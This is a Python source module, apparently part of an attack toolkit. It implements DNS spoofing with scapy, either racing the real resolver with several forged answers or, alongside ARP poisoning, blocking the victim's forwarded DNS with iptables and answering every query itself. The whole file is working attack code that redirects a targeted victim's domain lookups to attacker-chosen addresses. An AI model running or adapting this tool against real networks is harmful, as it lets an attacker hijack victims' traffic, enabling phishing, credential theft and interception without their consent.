"""
DNS Spoofing module for MITM attacks.

Supports two operational modes:
- DNS-only (race attack): Sniff DNS queries and race to respond before legitimate DNS server
- MITM mode: When ARP poisoning is active, victim sends DNS queries directly to attacker

Features:
- Load DNS rules from JSON file with domain → IP mappings
- Wildcard domain support (*.example.com)
- Thread-based background operation
- iptables rules to block forwarded DNS (ensures MITM mode reliability)
- DNS forwarding for non-spoofed domains in MITM mode
"""

# mypy: ignore-errors
from __future__ import annotations

import fnmatch
import json
import socket
import subprocess
import threading
from enum import Enum
from pathlib import Path

import click

from scapy.all import (  # pylint: disable=no-name-in-module,import-error
    DNS,
    DNSQR,
    DNSRR,
    IP,
    UDP,
    Ether,
    sendp,
    sniff,
    get_if_hwaddr,
    raw,
)
from scapy.error import Scapy_Exception


# Number of duplicate spoofed responses to send (helps win race conditions)
SPOOF_PACKET_COUNT = 3

# Upstream DNS server for forwarding non-spoofed queries
UPSTREAM_DNS = "8.8.8.8"
UPSTREAM_DNS_PORT = 53
DNS_TIMEOUT = 2.0


class DNSMode(Enum):
    """DNS spoofing operational modes."""
    RACE = "race"      # DNS-only: race against legitimate DNS server
    MITM = "mitm"      # ARP-DNS: victim sends DNS directly to us


def load_dns_rules(rules_path: str | Path) -> dict[str, str]:
    """Load DNS spoofing rules from a JSON file."""
    path = Path(rules_path)
    if not path.exists():
        raise FileNotFoundError(f"DNS rules file not found: {path}")

    with open(path, "r", encoding="utf-8") as f:
        rules = json.load(f)

    if not isinstance(rules, dict):
        raise ValueError("DNS rules must be a JSON object (dict)")

    normalized: dict[str, str] = {}
    for key, value in rules.items():
        if not isinstance(key, str) or not isinstance(value, str):
            raise ValueError("DNS rules must be a mapping of string domain patterns to string IPs")
        normalized[key.rstrip(".").lower()] = value

    return normalized


def match_domain(query_domain: str, rules: dict[str, str]) -> str | None:
    """Match a queried domain against DNS rules."""
    query_domain = query_domain.rstrip(".").lower()

    # Exact match
    if query_domain in rules:
        return rules[query_domain]

    # Wildcard match (*.example.com). Also match base domain (example.com).
    for pattern, ip in rules.items():
        if not pattern.startswith("*."):
            continue

        if fnmatch.fnmatch(query_domain, pattern):
            return ip

        base_domain = pattern[2:]
        if query_domain == base_domain:
            return ip

    return None


class DNSSpoofer:
    """
    DNS Spoofer that runs as a background thread.

    Intercepts DNS queries and responds with spoofed IP addresses
    according to configured rules.
    """

    def __init__(
        self,
        iface: str,
        rules: dict[str, str],
        mode: DNSMode = DNSMode.RACE,
        victim_ip: str | None = None,
        gateway_ip: str | None = None,
    ):
        self.iface = iface
        self.rules = rules
        self.mode = mode
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip

        # Get our MAC address
        self.attacker_mac = get_if_hwaddr(iface)

        # Thread control
        self._running = False
        self._thread: threading.Thread | None = None
        
        # Track if we added iptables rules (for cleanup)
        self._iptables_rules_added = False

    def _setup_iptables(self) -> None:
        """
        Set up iptables rules to intercept DNS traffic in MITM mode.
        
        In MITM mode, we need to:
        1. DROP forwarded DNS packets to the gateway (prevents kernel from forwarding)
        2. This gives our spoofer time to respond instead of racing the real DNS
        """
        if self.mode != DNSMode.MITM or not self.victim_ip or not self.gateway_ip:
            return
            
        try:
            # Drop DNS packets from victim that would be forwarded to gateway
            # This prevents the kernel from forwarding the DNS query before we can spoof
            cmd = [
                "iptables", "-I", "FORWARD", "1",
                "-s", self.victim_ip,
                "-d", self.gateway_ip,
                "-p", "udp", "--dport", "53",
                "-j", "DROP"
            ]
            subprocess.run(cmd, check=True, capture_output=True)
            
            self._iptables_rules_added = True
            click.echo(f"[+] iptables: Blocking DNS forwarding from {self.victim_ip} to {self.gateway_ip}")
            
        except subprocess.CalledProcessError as e:
            click.echo(f"[!] Warning: Failed to set iptables rules: {e}")
            click.echo("[!] DNS spoofing may be unreliable (kernel may forward packets before we can spoof)")
        except FileNotFoundError:
            click.echo("[!] Warning: iptables not found, DNS spoofing may be unreliable")

    def _cleanup_iptables(self) -> None:
        """Remove iptables rules that were added during setup."""
        if not self._iptables_rules_added or not self.victim_ip or not self.gateway_ip:
            return
            
        try:
            cmd = [
                "iptables", "-D", "FORWARD",
                "-s", self.victim_ip,
                "-d", self.gateway_ip,
                "-p", "udp", "--dport", "53",
                "-j", "DROP"
            ]
            subprocess.run(cmd, check=True, capture_output=True)
            click.echo("[+] iptables: Restored DNS forwarding rules")
            self._iptables_rules_added = False
        except subprocess.CalledProcessError:
            click.echo("[!] Warning: Failed to remove iptables rules")
        except FileNotFoundError:
            pass

    def _forward_dns_query(self, pkt) -> None:
        """
        Forward a DNS query to the upstream DNS server and relay response to victim.
        
        Used in MITM mode for domains we're not spoofing.
        """
        try:
            # Extract DNS query data
            dns_query = raw(pkt[DNS])
            
            # Forward to upstream DNS
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(DNS_TIMEOUT)
            sock.sendto(dns_query, (UPSTREAM_DNS, UPSTREAM_DNS_PORT))
            
            try:
                response_data, _ = sock.recvfrom(4096)
            except socket.timeout:
                click.echo("[!] DNS forward timeout for query")
                return
            finally:
                sock.close()
            
            # Build response packet to send back to victim
            # Ethernet: attacker MAC -> victim MAC
            # IP: gateway IP -> victim IP (so victim thinks response came from gateway)
            eth = Ether(src=self.attacker_mac, dst=pkt[Ether].src)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            udp = UDP(sport=53, dport=pkt[UDP].sport)
            
            # Parse the response and attach it
            dns_resp = DNS(response_data)
            
            response_pkt = eth / ip / udp / dns_resp
            sendp(response_pkt, iface=self.iface, verbose=False)
            
        except Exception as e:
            click.echo(f"[!] DNS forward error: {e}")

    def _build_dns_response(self, pkt, spoofed_ip: str) -> Ether | None:
        """
        Build a spoofed DNS response packet.

        Args:
            pkt: Original DNS query packet
            spoofed_ip: IP address to return in response

        Returns:
            Crafted DNS response packet or None on error
        """
        try:
            if not pkt.haslayer(Ether) or not pkt.haslayer(IP) or not pkt.haslayer(UDP):
                return None

            query_name = pkt[DNSQR].qname

            # Build Ethernet layer
            eth = Ether(src=self.attacker_mac, dst=pkt[Ether].src)

            # Build IP layer (swap src/dst)
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)

            # Build UDP layer (swap ports)
            udp = UDP(sport=53, dport=pkt[UDP].sport)

            # Build DNS response
            dns = DNS(
                id=pkt[DNS].id,  # Match query ID
                qr=1,  # This is a response
                aa=1,  # Authoritative answer
                rd=pkt[DNS].rd,  # Copy recursion desired flag
                ra=1,  # Recursion available
                qd=pkt[DNS].qd,  # Copy question section
                an=DNSRR(
                    rrname=query_name,
                    type="A",
                    ttl=300,
                    rdata=spoofed_ip,
                ),
            )

            return eth / ip / udp / dns

        except (KeyError, IndexError, AttributeError, TypeError, ValueError) as e:
            click.echo(f"[!] Error building DNS response: {e}")
            return None

    def _handle_packet(self, pkt) -> None:
        """Process a captured DNS packet."""
        try:
            if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
                return

            if pkt[DNS].qr == 1:  # It's a response, not query
                return

            # Get query details
            qname = pkt[DNSQR].qname
            if isinstance(qname, bytes):
                qname = qname.decode(errors="ignore")
            qname = qname.rstrip(".")

            # In MITM mode, filter to only handle victim's queries
            if self.mode == DNSMode.MITM and self.victim_ip:
                if pkt[IP].src != self.victim_ip:
                    return

            # Check if we should spoof this domain
            spoofed_ip = match_domain(qname, self.rules)

            if spoofed_ip is None:
                # No rule for this domain
                if self.mode == DNSMode.MITM:
                    # In MITM mode, we blocked forwarding, so we must forward manually
                    click.echo(f"[DNS] Forwarding {qname} to upstream DNS (no spoofing rule)")
                    self._forward_dns_query(pkt)
                # In RACE mode, do nothing - let the real DNS server respond
                return

            # Build and send spoofed response
            response = self._build_dns_response(pkt, spoofed_ip)
            if response is None:
                click.echo(f"[!] Failed to build DNS response for {qname}")
                return

            # Send the spoofed response multiple times to win race conditions
            # In MITM mode, one packet is usually enough since we block forwarding
            # In RACE mode, we send multiple to beat the real DNS server
            send_count = 1 if self.mode == DNSMode.MITM else SPOOF_PACKET_COUNT
            for _ in range(send_count):
                sendp(response, iface=self.iface, verbose=False)

            click.echo(f"[DNS] Spoofed {qname} → {spoofed_ip} (sent {send_count}x)")

        except (KeyError, IndexError, AttributeError, TypeError, ValueError, OSError) as e:
            click.echo(f"[!] Error handling DNS packet: {e}")

    def _build_filter(self) -> str:
        """Build BPF filter for DNS traffic."""
        bpf = "udp port 53"
        # Capture DNS queries from victim to gateway
        if self.victim_ip and self.gateway_ip:
            bpf = f"{bpf} and src host {self.victim_ip} and dst host {self.gateway_ip}"
        elif self.victim_ip:
            bpf = f"{bpf} and src host {self.victim_ip}"
        return bpf

    def _sniff_loop(self) -> None:
        """Main sniffing loop running in background thread."""
        bpf_filter = self._build_filter()
        click.echo(f"[+] DNS spoofer started in {self.mode.value.upper()} mode")
        click.echo(f"[+] Interface: {self.iface}, Filter: {bpf_filter}")
        click.echo(f"[+] Loaded {len(self.rules)} DNS spoofing rules")

        try:
            sniff(
                iface=self.iface,
                filter=bpf_filter,
                prn=self._handle_packet,
                store=False,
                stop_filter=lambda _: not self._running,
            )
        except (OSError, ValueError, Scapy_Exception) as e:
            click.echo(f"[!] DNS sniffer error: {e}")
        finally:
            click.echo("[*] DNS spoofer thread exiting.")

    def start(self) -> None:
        """Start DNS spoofing in a background thread."""
        if self._running:
            click.echo("[*] DNSSpoofer already running.")
            return

        # Set up iptables to block DNS forwarding (MITM mode only)
        self._setup_iptables()

        self._running = True
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Request DNS spoofing to stop."""
        if not self._running:
            return
        click.echo("[*] Stopping DNS spoofer...")
        self._running = False
        
        # Clean up iptables rules
        self._cleanup_iptables()

    def join(self, timeout: float | None = None) -> None:
        """Wait for the background thread to finish."""
        if self._thread is not None:
            self._thread.join(timeout)

    def is_running(self) -> bool:
        """Check if the spoofer is currently running."""
        return self._running


